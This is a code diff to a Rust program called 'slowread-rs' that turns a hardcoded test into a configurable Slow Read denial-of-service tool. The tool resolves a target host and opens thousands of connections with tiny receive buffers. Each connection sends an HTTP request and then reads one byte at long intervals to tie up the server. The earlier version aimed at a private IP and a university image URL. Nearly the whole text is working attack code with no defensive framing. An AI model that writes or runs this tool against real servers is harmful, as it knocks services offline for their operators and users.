@@ -1,47 +1,136 @@
 extern crate futures;
 extern crate http;
+#[macro_use]
+extern crate structopt;
 extern crate tokio;
+extern crate tokio_timer;
+extern crate trust_dns_resolver;
 
 use futures::future::join_all;
-use futures::prelude::*;
+use futures::future::{loop_fn, Future, Loop};
 use http::Request;
+use std::net::IpAddr;
+use std::net::Shutdown::Both;
 use std::net::SocketAddr;
+use std::time::Duration;
+use structopt::StructOpt;
 use tokio::io;
-use tokio::io::Error;
 use tokio::net::TcpStream;
+use tokio_timer::Timer;
+use tokio_timer::TimerError;
+use trust_dns_resolver::Resolver;
 
-fn main() {
-    let mut futures = vec![];
+#[derive(StructOpt, Debug)]
+#[structopt(name = "slowread-rs")]
+struct Options {
+    #[structopt(short = "a", long = "address")]
+    address: String,
 
-    for _ in 0..16000 {
-        futures.push(launch_attack());
-    }
+    #[structopt(short = "b", long = "buffer-size", default_value = "128")]
+    buffer_size: usize,
 
-    join_all(futures).wait();
+    #[structopt(short = "c", long = "connections", default_value = "10000")]
+    connections: usize,
+
+    #[structopt(
+        short = "w", long = "wait-time", default_value = "55000", parse(from_str = "parse_duration")
+    )]
+    wait_time: Duration,
 }
 
-fn launch_attack() -> impl Future<Item=(), Error=Error> {
-    const RECV_BUFFER_SIZE: usize = 128;
+fn parse_duration(src: &str) -> Duration {
+    let millis: u64 = src.parse().unwrap();
+    Duration::from_millis(millis)
+}
 
-    let socket_addr: SocketAddr = "192.168.27.131:80".parse().unwrap();
+fn main() {
+    let options = Options::from_args();
+    println!("{:?}", options);
+
+    let resolver = Resolver::from_system_conf().unwrap();
+    let response = resolver.lookup_ip(&options.address);
+
+    if response.is_err() {
+        let error = response.unwrap_err();
+        println!(
+            "Error resolving address \"{}\". \n{}\nAborting execution...",
+            options.address, error
+        );
+        return;
+    }
+
+    let ip_addr_option: Option<IpAddr> = response.unwrap().iter().next();
+
+    if ip_addr_option.is_none() {
+        println!(
+            "The address \"{}\" resolved to zero IP addresses. Aborting exeuction...",
+            options.address
+        );
+        return;
+    }
+
+    let socket_addr = SocketAddr::new(ip_addr_option.unwrap(), 80);
+    let url: String = "http://".to_owned() + &socket_addr.ip().to_string() + ":"
+        + &socket_addr.port().to_string();
+
+    let mut futures = vec![];
+
+    let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
+    tcp_stream
+        .set_recv_buffer_size(options.buffer_size)
+        .unwrap();
+
+    println!("Changing buffer size to {} bytes", options.buffer_size);
+    println!(
+        "Buffer size actually changed to {} bytes",
+        tcp_stream.recv_buffer_size().unwrap()
+    );
+
+    tcp_stream.shutdown(Both).unwrap();
+
+    for _ in 0..options.connections {
+        futures.push(launch_attack(
+            &socket_addr,
+            &url,
+            options.buffer_size,
+            options.wait_time.clone(),
+        ));
+    }
+
+    join_all(futures).wait().unwrap();
+}
+
+fn launch_attack(
+    socket_addr: &SocketAddr,
+    url: &str,
+    buffer_size: usize,
+    wait_time: Duration,
+) -> impl Future<Item = (Option<TcpStream>, [u8; 1]), Error = TimerError> {
     let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
 
-    tcp_stream.set_recv_buffer_size(RECV_BUFFER_SIZE);
+    tcp_stream.set_recv_buffer_size(buffer_size).unwrap();
 
-    println!("Changing buffer size to {} bytes", RECV_BUFFER_SIZE);
-    println!("Buffer size actually changed to {} bytes", tcp_stream.recv_buffer_size().unwrap());
-
-    let request = Request::get("https://ni.fe.up.pt/images/projects/PKyl13EDPj3HLxF4.png").body(()).unwrap();
+    let request = Request::get(url).body(()).unwrap();
     let request = build_http_request(&request);
 
-    io::write_all(&tcp_stream, request).wait();
+    io::write_all(&tcp_stream, request).wait().unwrap();
 
-    let buf = vec![];
+    let buf: [u8; 1] = [0; 1];
 
-    io::read_to_end(tcp_stream, buf)
-        .then(|_result| {
-            Ok(())
+    loop_fn((Some(tcp_stream), buf), move |(tcp_stream_option, _buf)| {
+        let tcp_stream = tcp_stream_option.unwrap();
+
+        Timer::default().sleep(wait_time).and_then(|_| {
+            let buf: [u8; 1] = [0; 1];
+
+            io::read_exact(tcp_stream, buf)
+                .and_then(|(tcp_stream, buf)| Ok(Loop::Continue((Some(tcp_stream), buf))))
+                .or_else(|_| {
+                    let buf: [u8; 1] = [0; 1];
+                    Ok(Loop::Break((None, buf)))
+                })
         })
+    })
 }
 
 fn build_http_request(request: &Request<()>) -> String {
